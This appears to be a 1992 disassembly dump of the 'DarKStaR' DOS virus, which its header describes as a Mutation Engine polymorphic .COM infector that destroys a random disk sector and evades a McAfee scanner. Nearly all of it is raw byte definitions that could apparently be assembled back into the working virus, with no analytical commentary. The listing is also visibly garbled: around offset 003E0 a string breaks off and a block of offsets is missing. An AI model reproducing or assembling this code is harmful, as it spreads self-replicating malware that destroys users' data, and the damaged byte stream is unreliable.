; File Name     : DARKSTAR.COM
; Current Date/Time : Mon Dec 07 09:09:16 1992
; Disasembly of British virus which was constructed with the Mutation Engine.
; Virus appears to destroy a random sector on default drive, is a .COM infector 
; and does NOT appear to scan with (McAfee) SCAN99.


S00100  SEGMENT
    ASSUME  CS:S00100, DS:S00100, ES:S00100, SS:NOTHING

    org 0100h

H00100: nop             ;00100  90
;---------------------------------------
;MEM: Data in Code Area
    db  0Fh dup(90h)        ;00101
    dw  2FE8h           ;00110  E82F         /
    db  00h         ;00112
    db  "NightMare Labs, United Kingdom"
                    ;00113  4E696768
    db  "-$- DarKStaR -$-"  ;00134  2D204461
    db  "-Z"            ;00141  2D5A
    db  0B1h            ;00143
    dw  0D304h          ;00144  04D3
    dw  83EAh           ;00146  EA83
    dw  10EAh           ;00148  EA10
    dw  0D98Ch          ;0014A  8CD9
    db  03h         ;0014C
    dw  0BACAh          ;0014D  CABA
    db  "D"         ;0014F  44
    db  01h         ;00150
    db  "QR"            ;00151  5152
    db  0CBh            ;00153
    dw  0BFFCh          ;00154  FCBF
    dw  0100h           ;00156  0001
    dw  5706h           ;00158  0657         W
    dw  1F0Eh           ;0015A  0E1F
    dw  6FBEh           ;0015C  BE6F         o
    dw  0A402h          ;0015E  02A4
    db  0A5h            ;00160
    db  "P"         ;00161  50
    dw  0CBAh           ;00162  BA0C
    db  0Bh         ;00164
    dw  1AB4h           ;00165  B41A
    db  0CDh            ;00167
    db  "!"         ;00168  21
    db  0B8h            ;00169
    db  "$"         ;0016A  24
    db  "5"         ;0016B  35
    db  0CDh            ;0016C
    db  "!"         ;0016D  21
    dw  5306h           ;0016E  0653         S
    dw  66BAh           ;00170  BA66         f
    dw  0B802h          ;00172  02B8
    db  "$"         ;00174  24
    db  "%"         ;00175  25
    db  0CDh            ;00176
    db  "!3"            ;00177  2133
    dw  0A3C0h          ;00179  C0A3
    db  "8"         ;0017B  38
    db  0Bh         ;0017C
    dw  06E8h           ;0017D  E806
    db  01h         ;0017F
    db  "TY+"           ;00180  54592B
    dw  83CCh           ;00183  CC83
    db  0C1h            ;00185
    dw  5104h           ;00186  0451         Q
    dw  69BAh           ;00188  BA69         i
    dw  0B102h          ;0018A  02B1
    db  03h         ;0018C
    dw  4EB4h           ;0018D  B44E         N
    db  0CDh            ;0018F
    db  "!r"            ;00190  2172
    db  0Fh         ;00192
    db  "8.&"           ;00193  382E26
    db  0Bh         ;00196
    db  "u7YQ"          ;00197  75375951
    dw  0CBAh           ;0019B  BA0C
    db  0Bh         ;0019D
    dw  4FB4h           ;0019E  B44F         O
    db  0EBh            ;001A0
    db  0EDh            ;001A1
    db  "Y"         ;001A2  59
    dw  0F5E2h          ;001A3  E2F5
    db  "s"         ;001A5  73
    db  15h         ;001A6
    dw  0F8E8h          ;001A7  E8F8
    dw  0A800h          ;001A9  00A8
    db  01h         ;001AB
    db  "t"         ;001AC  74
    dw  920Eh           ;001AD  0E92
    dw  19B4h           ;001AF  B419
    db  0CDh            ;001B1
    db  "!"         ;001B2  21
    db  0B9h            ;001B3
    db  01h         ;001B4
    dw  0BB00h          ;001B5  00BB
    dw  0100h           ;001B7  0001
    db  0CDh            ;001B9
    db  "&"         ;001BA  26
    db  9Dh         ;001BB
    db  "Z"         ;001BC  5A
    db  1Fh         ;001BD
    db  0B8h            ;001BE
    db  "$"         ;001BF  24
    db  "%"         ;001C0  25
    db  0CDh            ;001C1
    db  "!"         ;001C2  21
    dw  1F16h           ;001C3  161F
    dw  80BAh           ;001C5  BA80
    dw  0B400h          ;001C7  00B4
    dw  0CD1Ah          ;001C9  1ACD
    db  "!"         ;001CB  21
    dw  071Eh           ;001CC  1E07
    db  "X"         ;001CE  58
    db  0CBh            ;001CF
    db  "3"         ;001D0  33
    db  0C9h            ;001D1
    dw  2ABAh           ;001D2  BA2A         *
    db  0Bh         ;001D4
    dw  01B8h           ;001D5  B801
    db  "C"         ;001D7  43
    db  0CDh            ;001D8
    db  "!r"            ;001D9  2172
    dw  0B8C6h          ;001DB  C6B8
    dw  3D02h           ;001DD  023D         =
    db  0CDh            ;001DF
    db  "!r"            ;001E0  2172
    db  0BFh            ;001E2
    db  93h         ;001E3
    dw  6FBAh           ;001E4  BA6F         o
    dw  0B902h          ;001E6  02B9
    db  03h         ;001E8
    dw  0B400h          ;001E9  00B4
    db  "?"         ;001EB  3F
    db  0CDh            ;001EC
    db  "!r"            ;001ED  2172
    db  7Fh         ;001EF
    db  0A1h            ;001F0
    db  "o"         ;001F1  6F
    db  02h         ;001F2
    db  "=MZtw=ZMtr3"       ;001F3  3D4D5A74
    db  0C9h            ;001FE
    db  "3"         ;001FF  33
    dw  0B8D2h          ;00200  D2B8
    dw  4202h           ;00202  0242         B
    db  0CDh            ;00204
    db  "!"         ;00205  21
    db  85h         ;00206
    db  0D2h            ;00207
    db  "ue="           ;00208  75653D
    dw  0E000h          ;0020B  00E0
    db  "s`"            ;0020D  7360
    db  8Bh         ;0020F
    dw  2DE8h           ;00210  E82D         -
    db  03h         ;00212
    dw  0A300h          ;00213  00A3
    db  "s"         ;00215  73
    dw  0B802h          ;00216  02B8
    dw  5700h           ;00218  0057         W
    db  0CDh            ;0021A
    db  "!RQ"           ;0021B  215251
    dw  49B8h           ;0021E  B849         I
    dw  0B10Ch          ;00220  0CB1
    dw  0D304h          ;00222  04D3
    dw  8CE8h           ;00224  E88C
    db  0C9h            ;00226
    db  03h         ;00227
    db  0C1h            ;00228
    dw  0C08Eh          ;00229  8EC0
    dw  00BAh           ;0022B  BA00
    db  01h         ;0022D
    db  0B9h            ;0022E
    dw  0B0Ch           ;0022F  0C0B
    db  "US"            ;00231  5553
    db  03h         ;00233
    dw  33EAh           ;00234  EA33         3
    dw  33F6h           ;00236  F633         3
    db  0FFh            ;00238
    db  0B3h            ;00239
    db  0Fh         ;0023A
    dw  01B8h           ;0023B  B801
    db  01h         ;0023D
    dw  0B0E8h          ;0023E  E8B0
    db  00h         ;00240
    db  "[X"            ;00241  5B58
    db  03h         ;00243
    db  0C1h            ;00244
    db  0F7h            ;00245
    dw  32D8h           ;00246  D832         2
    dw  03E4h           ;00248  E403
    dw  0B4C8h          ;0024A  C8B4
    db  "@"         ;0024C  40
    db  0CDh            ;0024D
    db  "!"         ;0024E  21
    dw  1F0Eh           ;0024F  0E1F
    db  "r"         ;00251  72
    db  15h         ;00252
    db  "+"         ;00253  2B
    dw  75C8h           ;00254  C875         u
    db  11h         ;00256
    db  "3"         ;00257  33
    dw  0B8D2h          ;00258  D2B8
    dw  4200h           ;0025A  0042         B
    db  0CDh            ;0025C
    db  "!"         ;0025D  21
    dw  72BAh           ;0025E  BA72         r
    dw  0B902h          ;00260  02B9
    db  03h         ;00262
    dw  0B400h          ;00263  00B4
    db  "@"         ;00265  40
    db  0CDh            ;00266
    db  "!YZ"           ;00267  21595A
    dw  01B8h           ;0026A  B801
    db  "W"         ;0026C  57
    db  0CDh            ;0026D
    db  "!"         ;0026E  21
    dw  3EB4h           ;0026F  B43E         >
    db  0CDh            ;00271
    db  "!"         ;00272  21
    db  0E9h            ;00273
    db  ","         ;00274  2C
    db  0FFh            ;00275
    dw  03B0h           ;00276  B003
    db  0CFh            ;00278
    db  "*.COM"         ;00279  2A2E434F
    dw  0C300h          ;0027E  00C3
    dw  0000h           ;00280  0000
    db  0E9h            ;00282
    db  0FDh            ;00283
    dw  0000h           ;00284  0000
    db  1Eh         ;00286
    db  "VRQS2"         ;00287  56525153
    dw  0CDE4h          ;0028C  E4CD
    dw  0E41Ah          ;0028E  1AE4
    db  "@"         ;00290  40
    dw  0E08Ah          ;00291  8AE0
    db  0E4h            ;00293
    db  "@3"            ;00294  4033
    db  0C1h            ;00296
    db  "3"         ;00297  33
    dw  0ED0h           ;00298  D00E
    db  1Fh         ;0029A
    dw  38BEh           ;0029B  BE38         8
    db  0Bh         ;0029D
    db  "2"         ;0029E  32
    db  0FFh            ;0029F
    db  0EBh            ;002A0
    db  "("         ;002A1  28
    db  1Eh         ;002A2
    db  "VRQS"          ;002A3  56525153
    dw  1F0Eh           ;002A7  0E1F
    dw  38BEh           ;002A9  BE38         8
    db  0Bh         ;002AB
    dw  1C8Ah           ;002AC  8A1C
    db  "2"         ;002AE  32
    db  0FFh            ;002AF
    db  8Bh         ;002B0
    db  "@"         ;002B1  40
    dw  8B02h           ;002B2  028B
    db  "P"         ;002B4  50
    dw  8004h           ;002B5  0480
    dw  0404h           ;002B7  0404
    db  0B9h            ;002B9
    db  07h         ;002BA
    dw  0D100h          ;002BB  00D1
    dw  0D1E0h          ;002BD  E0D1
    dw  8AD2h           ;002BF  D28A
    dw  32D8h           ;002C1  D832         2
    dw  79DEh           ;002C3  DE79         y
    dw  0FE02h          ;002C5  02FE
    dw  0E2C0h          ;002C7  C0E2
    dw  8AF2h           ;002C9  F28A
    db  "\"         ;002CB  5C
    db  01h         ;002CC
    db  89h         ;002CD
    db  "@"         ;002CE  40
    dw  8902h           ;002CF  0289
    db  "P"         ;002D1  50
    dw  8004h           ;002D2  0480
    db  0C3h            ;002D4
    dw  8804h           ;002D5  0488
    db  "\"         ;002D7  5C
    db  01h         ;002D8
    dw  0C28Ah          ;002D9  8AC2
    db  ":"         ;002DB  3A
    dw  751Ch           ;002DC  1C75         u
    db  03h         ;002DE
    dw  0480h           ;002DF  8004
    db  04h         ;002E1
    db  "[YZ^"          ;002E2  5B595A5E
    db  1Fh         ;002E6
    db  0C3h            ;002E7
    db  "MtE 0.90"      ;002E8  4D744520
    db  0E1h            ;002F0
    dw  1EFCh           ;002F1  FC1E
    db  "RU"            ;002F3  5255
    dw  26E8h           ;002F5  E826         &
    dw  8B00h           ;002F7  008B
    dw  95DAh           ;002F9  DA95
    db  "Z^]+"          ;002FB  5A5E5D2B
    db  0DFh            ;002FF
    db  "SWQ"           ;00300  535751
    dw  0BEE8h          ;00303  E8BE
    db  00h         ;00305
    db  "Y^"            ;00306  595E
    db  0BFh            ;00308
    db  "Y"         ;00309  59
    db  05h         ;0030A
    db  "+"         ;0030B  2B
    db  0F9h            ;0030C
    db  "WR"            ;0030D  5752
    db  0F3h            ;0030F
    db  0A4h            ;00310
    db  "YZ^+"          ;00311  595A5E2B
    dw  2BCAh           ;00315  CA2B         +
    dw  0A1FAh          ;00317  FAA1
    db  "6"         ;00319  36
    db  01h         ;0031A
    db  0F7h            ;0031B
    dw  0C3D8h          ;0031C  D8C3
    dw  1F06h           ;0031E  061F
    db  83h         ;00320
    db  0C1h            ;00321
    dw  0F716h          ;00322  16F7
    db  0D9h            ;00324
    dw  0E180h          ;00325  80E1
    dw  75FEh           ;00327  FE75         u
    db  02h         ;00329
    db  "II"            ;0032A  4949
    db  97h         ;0032C
    db  0A3h            ;0032D
    db  "2"         ;0032E  32
    db  01h         ;0032F
    db  03h         ;00330
    db  0C1h            ;00331
    db  "$"         ;00332  24
    dw  75FEh           ;00333  FE75         u
    db  02h         ;00335
    db  "HHP"           ;00336  484850
    db  97h         ;00339
    db  0BFh            ;0033A
    db  "4"         ;0033B  34
    db  01h         ;0033C
    db  0ABh            ;0033D
    db  91h         ;0033E
    db  0ABh            ;0033F
    db  95h         ;00340
    db  0ABh            ;00341
    dw  0AB96h          ;00342  96AB
    db  0B1h            ;00344
    db  " "         ;00345  20
    dw  0E1D2h          ;00346  D2E1
    dw  0F180h          ;00348  80F1
    db  " "         ;0034A  20
    dw  4D88h           ;0034B  884D         M
    db  0F3h            ;0034D
    db  "]US"           ;0034E  5D5553
    dw  32E8h           ;00351  E832         2
    db  0FFh            ;00353
    db  0BFh            ;00354
    db  "<"         ;00355  3C
    db  01h         ;00356
    db  0B9h            ;00357
    dw  0008h           ;00358  0800
    dw  0FFB0h          ;0035A  B0FF
    db  0F3h            ;0035C
    dw  0BFAAh          ;0035D  AABF
    db  "Y"         ;0035F  59
    db  01h         ;00360
    db  0B3h            ;00361
    db  07h         ;00362
    dw  19E8h           ;00363  E819
    dw  4F00h           ;00365  004F         O
    db  81h         ;00367
    db  0FFh            ;00368
    db  "Y"         ;00369  59
    db  01h         ;0036A
    db  "t"         ;0036B  74
    db  0Eh         ;0036C
    db  "RWU"           ;0036D  525755
    dw  01B8h           ;00370  B801
    dw  0E800h          ;00372  00E8
    dw  00B0h           ;00374  B000
    db  "_"         ;00376  5F
    db  95h         ;00377
    db  0ABh            ;00378
    db  "_Z[X3"         ;00379  5F5A5B58
    db  0EDh            ;0037E
    db  "PSRW3"         ;0037F  50535257
    dw  0BFC0h          ;00384  C0BF
    db  "c"         ;00386  63
    dw  8B00h           ;00387  008B
    db  0CFh            ;00389
    db  0F3h            ;0038A
    db  0ABh            ;0038B
    dw  04B0h           ;0038C  B004
    dw  4586h           ;0038E  8645         E
    dw  500Ch           ;00390  0C50         P
    db  8Bh         ;00392
    db  "U"         ;00393  55
    db  0Dh         ;00394
    db  0BFh            ;00395
    db  "Y"         ;00396  59
    db  03h         ;00397
    db  "U"         ;00398  55
    dw  0C9E8h          ;00399  E8C9
    dw  5D02h           ;0039B  025D         ]
    dw  4AE8h           ;0039D  E84A         J
    db  02h         ;0039F
    db  "X_Z"           ;003A0  585F5A
    dw  35A2h           ;003A3  A235         5
    db  01h         ;003A5
    db  "$"         ;003A6  24
    db  01h         ;003A7
    db  "("         ;003A8  28
    dw  2F06h           ;003A9  062F         /
    db  01h         ;003AB
    db  "P"         ;003AC  50
    dw  0C0E8h          ;003AD  E8C0
    dw  5802h           ;003AF  0258         X
    dw  4400h           ;003B1  0044         D
    db  0E3h            ;003B3
    db  93h         ;003B4
    db  "[-P"           ;003B5  5B2D50
    db  01h         ;003B8
    db  "r"         ;003B9  72
    db  93h         ;003BA
    db  "u"         ;003BB  75
    db  05h         ;003BC
    db  "9D"            ;003BD  3944
    dw  75EEh           ;003BF  EE75         u
    dw  5B8Ch           ;003C1  8C5B         [
    db  0C3h            ;003C3
    db  03h         ;003C4
    dw  8BCAh           ;003C5  CA8B
    db  0D7h            ;003C7
    db  97h         ;003C8
    db  0A1h            ;003C9
    db  "2"         ;003CA  32
    db  01h         ;003CB
    db  85h         ;003CC
    dw  75C0h           ;003CD  C075         u
    db  03h         ;003CF
    db  0BFh            ;003D0
    db  "Y"         ;003D1  59
    db  05h         ;003D2
    db  0BBh            ;003D3
    db  "Y"         ;003D4  59
    db  01h         ;003D5
    db  "QP;"           ;003D6  51503B
    dw  74DAh           ;003D9  DA74         t
    db  0Fh         ;003DB
    db  "K"         ;003DC  4B
    dw  078Ah           ;003DD  8A07
    db  "4"         ;003DF  34
    db  01h         ;003E0
    db  "
    dw  9500h           ;00447  0095
    db  07h         ;00449
    db  "_"         ;0044A  5F
    dw  58FAh           ;0044B  FA58         X
    db  0ABh            ;0044D
    db  "X"         ;0044E  58
    db  0ABh            ;0044F
    db  0FBh            ;00450
    db  "["         ;00451  5B
    dw  071Eh           ;00452  1E07
    db  0BFh            ;00454
    db  "c"         ;00455  63
    dw  3300h           ;00456  0033         3
    dw  0B9F6h          ;00458  F6B9
    db  "!"         ;0045A  21
    dw  3300h           ;0045B  0033         3
    dw  0F3C0h          ;0045D  C0F3
    db  0AFh            ;0045F
    db  "t'"            ;00460  7427
    db  8Bh         ;00462
    db  "E"         ;00463  45
    dw  3BFEh           ;00464  FE3B         ;
    dw  72C6h           ;00466  C672         r
    db  0F3h            ;00468
    dw  01BAh           ;00469  BA01
    dw  9600h           ;0046B  0096
    db  8Bh         ;0046D
    db  "E@;"           ;0046E  45403B
    db  0C3h            ;00471
    db  "t"         ;00472  74
    db  07h         ;00473
    db  0Bh         ;00474
    dw  75C0h           ;00475  C075         u
    dw  0ACE4h          ;00477  E4AC
    dw  9298h           ;00479  9892
    dw  24E8h           ;0047B  E824         $
    dw  88FEh           ;0047D  FE88
    db  04h         ;0047F
    db  "FJu"           ;00480  464A75
    db  0F7h            ;00483
    db  0EBh            ;00484
    dw  06D6h           ;00485  D606
    db  "S"         ;00487  53
    db  0CBh            ;00488
    db  "Z"         ;00489  5A
    db  0C3h            ;0048A
    db  "U"         ;0048B  55
    db  8Bh         ;0048C
    db  0ECh            ;0048D
    db  "WQSP"          ;0048E  57515350
    db  8Bh         ;00492
    db  "^"         ;00493  5E
    dw  8A02h           ;00494  028A
    db  07h         ;00496
    db  "u"         ;00497  75
    dw  930Eh           ;00498  0E93
    db  0BFh            ;0049A
    db  0E7h            ;0049B
    dw  0B900h          ;0049C  00B9
    db  "!"         ;0049E  21
    dw  0F200h          ;0049F  00F2
    db  0AFh            ;004A1
    db  0FFh            ;004A2
    db  "E"         ;004A3  45
    dw  8ABCh           ;004A4  BC8A
    db  0C5h            ;004A6
    dw  4098h           ;004A7  9840         @
    db  01h         ;004A9
    db  "F"         ;004AA  46
    db  02h         ;004AB
    db  "X[Y_]"         ;004AC  585B595F
    db  0CFh            ;004B1
    db  0BFh            ;004B2
    db  ")"         ;004B3  29
    db  01h         ;004B4
    dw  01B8h           ;004B5  B801
    db  01h         ;004B7
    dw  0ABAAh          ;004B8  AAAB
    dw  81B4h           ;004BA  B481
    db  0A3h            ;004BC
    dw  0000h           ;004BD  0000
    dw  0E0E8h          ;004BF  E8E0
    db  0FDh            ;004C1
    dw  0E892h          ;004C2  92E8
    dw  0FDDCh          ;004C4  DCFD
    dw  5D8Ah           ;004C6  8A5D         ]
    db  0FFh            ;004C8
    db  "2"         ;004C9  32
    db  0FFh            ;004CA
    db  8Bh         ;004CB
    db  0F3h            ;004CC
    db  8Bh         ;004CD
    db  "L"         ;004CE  4C
    db  0FFh            ;004CF
    dw  0FD80h          ;004D0  80FD
    dw  7506h           ;004D2  0675         u
    db  05h         ;004D4
    dw  0CA80h          ;004D5  80CA
    db  01h         ;004D7
    db  0EBh            ;004D8
    db  17h         ;004D9
    dw  0FD80h          ;004DA  80FD
    dw  7586h           ;004DC  8675         u
    db  03h         ;004DE
    db  "2"         ;004DF  32
    db  0C9h            ;004E0
    db  "C"         ;004E1  43
    dw  4522h           ;004E2  2245        "E
    dw  3A02h           ;004E4  023A         :
    db  0C3h            ;004E6
    db  "s "            ;004E7  7320
    dw  0EBD0h          ;004E9  D0EB
    db  "s"         ;004EB  73
    dw  0A04h           ;004EC  040A
    db  0C9h            ;004EE
    db  "t"         ;004EF  74
    dw  0A02h           ;004F0  020A
    dw  0B0D2h          ;004F2  D2B0
    dw  7500h           ;004F4  0075         u
    dw  0B06h           ;004F6  060B
    db  0EDh            ;004F8
    db  "u"         ;004F9  75
    dw  0B0DAh          ;004FA  DAB0
    dw  0A02h           ;004FC  020A
    db  0EDh            ;004FE
    db  "y"         ;004FF  79
    dw  8904h           ;00500  0489
    db  "5"         ;00502  35
    dw  01B0h           ;00503  B001
    dw  0488h           ;00505  8804
    db  0EBh            ;00507
    db  "."         ;00508  2E
    dw  0D492h          ;00509  92D4
    dw  800Ch           ;0050B  0C80
    db  0E5h            ;0050D
    dw  7480h           ;0050E  8074         t
    dw  0D002h          ;00510  02D0
    db  0E8h            ;00512
    db  "@@@"           ;00513  404040
    dw  0E08Ah          ;00516  8AE0
    dw  0488h           ;00518  8804
    dw  558Ah           ;0051A  8A55         U
    dw  42FEh           ;0051C  FE42         B
    dw  0F28Ah          ;0051E  8AF2
    dw  0C6FEh          ;00520  FEC6
    dw  7588h           ;00522  8875         u
    dw  8AFEh           ;00524  FE8A
    dw  0B7DAh          ;00526  DAB7
    dw  8A00h           ;00528  008A
    db  0CFh            ;0052A
    db  "s"         ;0052B  73
    dw  3C04h           ;0052C  043C         <
    dw  7206h           ;0052E  0672         r
    dw  8602h           ;00530  0286
    db  0CDh            ;00532
    db  "3"         ;00533  33
    db  0C1h            ;00534
    db  89h         ;00535
    db  07h         ;00536
    db  0D1h            ;00537
    dw  89E6h           ;00538  E689
    db  "T!"            ;0053A  5421
    dw  45FEh           ;0053C  FE45         E
    db  0FFh            ;0053E
    dw  458Ah           ;0053F  8A45         E
    db  0FEh            ;00541
    db  ":E"            ;00542  3A45
    db  0FFh            ;00544
    db  "rC"            ;00545  7243
    db  0E9h            ;00547
    db  "u"         ;00548  75
    db  0FFh            ;00549
    db  "M"         ;0054A  4D
    dw  0F60Ah          ;0054B  0AF6
    db  "yq"            ;0054D  7971
    db  8Ah         ;0054F
    db  "4Et"           ;00550  344574
    db  0F6h            ;00553
    db  "Mu4S"          ;00554  4D753453
    db  0BBh            ;00558
    db  7Fh         ;00559
    db  05h         ;0055A
    dw  0C686h          ;0055B  86C6
    db  "."         ;0055D  2E
    db  0D7h            ;0055E
    db  "<"         ;0055F  3C
    dw  8686h           ;00560  8686
    dw  93C6h           ;00562  C693
    db  0B1h            ;00564
    db  "."         ;00565  2E
    dw  35A0h           ;00566  A035         5
    db  01h         ;00568
    db  "u"         ;00569  75
    dw  0A80Ah          ;0056A  0AA8
    dw  7502h           ;0056C  0275         u
    dw  0B102h          ;0056E  02B1
    db  ">"         ;00570  3E
    dw  04A8h           ;00571  A804
    db  0EBh            ;00573
    dw  0A808h          ;00574  08A8
    dw  7504h           ;00576  0475         u
    dw  0B102h          ;00578  02B1
    db  "6"         ;0057A  36
    dw  02A8h           ;0057B  A802
    db  "t"         ;0057D  74
    db  03h         ;0057E
    dw  0C18Ah          ;0057F  8AC1
    dw  58AAh           ;00581  AA58         X
    dw  3DE8h           ;00583  E83D         =
    dw  8900h           ;00585  0089
    db  "|"         ;00587  7C
    dw  0ABE4h          ;00588  E4AB
    db  0C3h            ;0058A
    db  8Bh         ;0058B
    db  0D5h            ;0058C
    db  8Dh         ;0058D
    db  "m"         ;0058E  6D
    db  01h         ;0058F
    db  0F9h            ;00590
    db  0C3h            ;00591
    db  87h         ;00592
    dw  8600h           ;00593  0086
    dw  8584h           ;00595  8485
    db  "5"         ;00597  35
    db  0E7h            ;00598
    dw  0F60Ah          ;00599  0AF6
    db  "x"         ;0059B  78
    dw  3AB2h           ;0059C  B23A         :
    dw  74F0h           ;0059E  F074         t
    db  0E9h            ;005A0
    dw  7C80h           ;005A1  807C         |
    db  0E3h            ;005A3
    db  0FFh            ;005A4
    db  "u"         ;005A5  75
    db  19h         ;005A6
    db  "P"         ;005A7  50
    dw  0F60Ah          ;005A8  0AF6
    db  "t"         ;005AA  74
    dw  0A06h           ;005AB  060A
    dw  75C0h           ;005AD  C075         u
    db  0Fh         ;005AF
    dw  0C68Ah          ;005B0  8AC6
    db  0Bh         ;005B2
    db  0EDh            ;005B3
    db  "u"         ;005B4  75
    dw  3A04h           ;005B5  043A         :
    dw  7404h           ;005B7  0474         t
    db  05h         ;005B9
    db  "["         ;005BA  5B
    dw  900Ch           ;005BB  0C90
    dw  0C3AAh          ;005BD  AAC3
    db  "X"         ;005BF  58
    dw  180Ch           ;005C0  0C18
    db  93h         ;005C2
    dw  93AAh           ;005C3  AA93
    db  0B1h            ;005C5
    db  03h         ;005C6
    dw  0E0D2h          ;005C7  D2E0
    dw  0C60Ah          ;005C9  0AC6
    dw  0C3AAh          ;005CB  AAC3
    db  8Bh         ;005CD
    dw  0D0D8h          ;005CE  D8D0
    dw  8BE8h           ;005D0  E88B
    dw  0D1C8h          ;005D2  C8D1
    db  0E1h            ;005D4
    db  0BFh            ;005D5
    db  "#"         ;005D6  23
    dw  0F200h          ;005D7  00F2
    dw  75AEh           ;005D9  AE75         u
    dw  8DB4h           ;005DB  B48D
    db  "u"         ;005DD  75
    dw  0D1DEh          ;005DE  DED1
    dw  80EEh           ;005E0  EE80
    db  "<"         ;005E2  3C
    db  03h         ;005E3
    db  "r"         ;005E4  72
    dw  8DF2h           ;005E5  F28D
    db  "E"         ;005E7  45
    dw  0C3DEh          ;005E8  DEC3
    dw  2CA0h           ;005EA  A02C         ,
    db  01h         ;005EC
    dw  0D098h          ;005ED  98D0
    dw  0E8E0h          ;005EF  E0E8
    dw  0FFDAh          ;005F1  DAFF
    db  "ro"            ;005F3  726F
    dw  29A2h           ;005F5  A229         )
    db  01h         ;005F7
    dw  0D2E8h          ;005F8  E8D2
    db  0FFh            ;005FA
    db  "s"         ;005FB  73
    dw  3202h           ;005FC  0232         2
    dw  50C0h           ;005FE  C050         P
    dw  0E8D0h          ;00600  D0E8
    db  88h         ;00602
    db  "G!"            ;00603  4721
    dw  0EBD0h          ;00605  D0EB
    db  9Fh         ;00607
    dw  078Ah           ;00608  8A07
    db  "$"         ;0060A  24
    db  7Fh         ;0060B
    db  "<"         ;0060C  3C
    db  03h         ;0060D
    db  "u"         ;0060E  75
    dw  9E06h           ;0060F  069E
    db  "rH@"           ;00611  724840
    db  0EBh            ;00614
    db  "C<"            ;00615  433C
    dw  7504h           ;00617  0475         u
    db  0Dh         ;00619
    dw  739Eh           ;0061A  9E73         s
    db  07h         ;0061C
    db  8Bh         ;0061D
    db  0F3h            ;0061E
    db  0B1h            ;0061F
    dw  0D308h          ;00620  08D3
    db  "@!H"           ;00622  402148
    db  0EBh            ;00625
    db  "2<"            ;00626  323C
    db  06h         ;00628
    db  "r0u*"          ;00629  7230752A
    dw  0E3D0h          ;0062D  D0E3
    db  8Ah         ;0062F
    db  "_"         ;00630  5F
    dw  0D022h          ;00631  22D0        "
    db  0E3h            ;00633
    db  8Bh         ;00634
    db  "w!3"           ;00635  772133
    dw  0BAC0h          ;00638  C0BA
    db  01h         ;0063A
    dw  8B00h           ;0063B  008B
    dw  8BC8h           ;0063D  C88B
    dw  89FAh           ;0063F  FA89
    db  7Fh         ;00641
    db  "!Nt"           ;00642  214E74
    db  15h         ;00645
    db  "F"         ;00646  46
    db  0F7h            ;00647
    dw  52F6h           ;00648  F652         R
    db  0F7h            ;0064A
    db  0E7h            ;0064B
    db  "+"         ;0064C  2B
    dw  87C8h           ;0064D  C887
    db  0CFh            ;0064F
    db  8Bh         ;00650
    dw  33C6h           ;00651  C633         3
    dw  5ED2h           ;00653  D25E         ^
    db  0EBh            ;00655
    db  0E9h            ;00656
    db  "4"         ;00657  34
    db  0Fh         ;00658
    dw  0788h           ;00659  8807
    db  "X"         ;0065B  58
    dw  0C00Ah          ;0065C  0AC0
    db  "u"         ;0065E  75
    dw  0D098h          ;0065F  98D0
    db  ".)"            ;00661  2E29
    db  01h         ;00663
    db  0C3h            ;00664
    dw  1E88h           ;00665  881E
    db  "."         ;00667  2E
    db  01h         ;00668
    db  "RW"            ;00669  5257
    dw  44E8h           ;0066B  E844         D
    db  0FEh            ;0066D
    db  "_ZW"           ;0066E  5F5A57
    db  0BFh            ;00671
    db  "D"         ;00672  44
    db  01h         ;00673
    dw  0FFB8h          ;00674  B8FF
    db  0FFh            ;00676
    db  0ABh            ;00677
    dw  0C0FEh          ;00678  FEC0
    db  0ABh            ;0067A
    db  0ABh            ;0067B
    dw  0C8FEh          ;0067C  FEC8
    db  0ABh            ;0067E
    dw  4588h           ;0067F  8845         E
    db  03h         ;00681
    dw  5D8Ah           ;00682  8A5D         ]
    db  0DDh            ;00684
    db  "SR"            ;00685  5352
    dw  9AE8h           ;00687  E89A
    db  01h         ;00689
    db  8Bh         ;0068A
    db  0F7h            ;0068B
    dw  0F9E8h          ;0068C  E8F9
    db  01h         ;0068E
    db  "Z[_SEt"        ;0068F  5A5B5F53
    db  04h         ;00695
    db  "MubEMBt"       ;00696  4D756245
    db  08h         ;0069D
    db  "JM"            ;0069E  4A4D
    dw  048Ah           ;006A0  8A04
    dw  58E8h           ;006A2  E858         X
    db  04h         ;006A4
    db  "E[W"           ;006A5  455B57
    dw  05E8h           ;006A8  E805
    dw  0B02h           ;006AA  020B
    db  0EDh            ;006AC
    db  "uDYM"          ;006AD  7544594D
    dw  50B8h           ;006B1  B850         P
    db  01h         ;006B3
    db  87h         ;006B4
    db  "D"         ;006B5  44
    dw  0AE4h           ;006B6  E40A
    db  0F6h            ;006B8
    db  "x EQP"         ;006B9  78204551
    dw  448Ah           ;006BE  8A44         D
    db  03h         ;006C0
    db  "$"         ;006C1  24
    db  0B7h            ;006C2
    db  "<"         ;006C3  3C
    db  87h         ;006C4
    db  "uK;l"          ;006C5  754B3B6C
    db  0EEh            ;006C9
    db  "uF"            ;006CA  7546
    dw  7580h           ;006CC  8075         u
    dw  02FCh           ;006CE  FC02
    dw  64D0h           ;006D0  D064         d
    db  03h         ;006D2
    db  "yJ"            ;006D3  794A
    db  0B3h            ;006D5
    db  0F7h            ;006D6
    dw  03B0h           ;006D7  B003
    db  0EBh            ;006D9
    db  "A"         ;006DA  41
    db  81h         ;006DB
    db  0F9h            ;006DC
    db  "\"         ;006DD  5C
    db  01h         ;006DE
    db  "u"         ;006DF  75
    db  0Dh         ;006E0
    db  83h         ;006E1
    db  0E9h            ;006E2
    db  03h         ;006E3
    db  83h         ;006E4
    db  0EFh            ;006E5
    db  03h         ;006E6
    dw  1C8Ah           ;006E7  8A1C
    db  "2"         ;006E9  32
    db  0FFh            ;006EA
    dw  48FEh           ;006EB  FE48         H
    dw  0BBF0h          ;006ED  F0BB
    db  "P"         ;006EF  50
    db  01h         ;006F0
    db  0EBh            ;006F1
    db  "m"         ;006F2  6D
    dw  0F60Ah          ;006F3  0AF6
    db  "y"         ;006F5  79
    dw  8A14h           ;006F6  148A
    db  "4"         ;006F8  34
    db  0EBh            ;006F9
    dw  5510h           ;006FA  1055         U
    dw  0B1E8h          ;006FC  E8B1
    db  01h         ;006FE
    dw  448Ah           ;006FF  8A44         D
    db  01h         ;00701
    dw  900Ch           ;00702  0C90
    dw  58AAh           ;00704  AA58         X
    dw  0F60Ah          ;00706  0AF6
    db  "y"         ;00708  79
    db  01h         ;00709
    dw  5892h           ;0070A  9258         X
    db  0B7h            ;0070C
    db  0FFh            ;0070D
    dw  05C6h           ;0070E  C605
    db  0CBh            ;00710
    db  0C3h            ;00711
    dw  8DE8h           ;00712  E88D
    db  0FBh            ;00714
    db  "$"         ;00715  24
